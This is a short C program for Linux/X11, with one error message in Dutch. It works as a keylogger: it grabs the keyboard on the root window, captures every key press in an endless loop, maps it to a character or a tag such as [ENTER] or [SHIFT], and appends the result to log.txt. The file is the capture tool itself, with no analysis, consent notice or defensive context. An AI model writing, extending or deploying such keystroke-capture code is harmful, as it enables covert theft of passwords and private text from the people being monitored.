#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <unistd.h>

#define LOG_FILE "log.txt"

void logKey(char *key) {
    FILE *file = fopen(LOG_FILE, "a");
    if (file == NULL) {
        return;
    }
    fprintf(file, "%s", key);
    fclose(file);
}

int main() {
    Display *display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Kan X11 display niet openen.\n");
        return 1;
    }

    Window root = DefaultRootWindow(display);
    XEvent event;

    XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime);

    while (1) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            KeySym keysym = XLookupKeysym(&event.xkey, 0);
            char key[32];

            switch (keysym) {
                case XK_Return: sprintf(key, " [ENTER] \n"); break;
                case XK_BackSpace: sprintf(key, " [BACKSPACE] "); break;
                case XK_Tab: sprintf(key, " [TAB] "); break;
                case XK_Shift_L:
                case XK_Shift_R: sprintf(key, " [SHIFT] "); break;
                case XK_Control_L:
                case XK_Control_R: sprintf(key, " [CTRL] "); break;
                case XK_Escape: sprintf(key, " [ESC] "); break;
                case XK_space: sprintf(key, " [SPACE] "); break;
                default:
                    if (keysym < 128) {
                        sprintf(key, "%c", (char) keysym);
                    } else {
                        sprintf(key, " [UNK] ");
                    }
                    break;
            }

            logKey(key);
        }
        usleep(10000);
    }

    XCloseDisplay(display);
    return 0;
}
